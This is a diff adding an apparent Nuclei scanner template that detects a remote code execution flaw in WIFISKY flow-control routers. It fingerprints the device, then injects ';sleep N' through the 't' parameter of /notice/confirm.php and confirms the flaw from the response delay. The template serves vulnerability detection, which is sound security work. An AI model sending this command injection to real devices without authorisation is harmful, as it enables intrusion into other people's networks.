@@ -1,0 +1,43 @@
+id: poc-yaml-WIFISKY-7-story-flow-control-router-confirm-rce
+info:
+  name: WIFISKY 7层流控路由器 confirm 远程代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "200 OK"
+      - type: word
+        part: body
+        words:
+          - "WIFISKY 7层流控路由器"
+
+  - raw:
+      - |
+        GET /notice/confirm.php?t=;sleep%20{{t1}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: size
+        size:
+          - 0
+      - type: dsl
+        dsl:
+          - 'duration > to_number(t1)'
+          - 'duration < to_number(t2)'
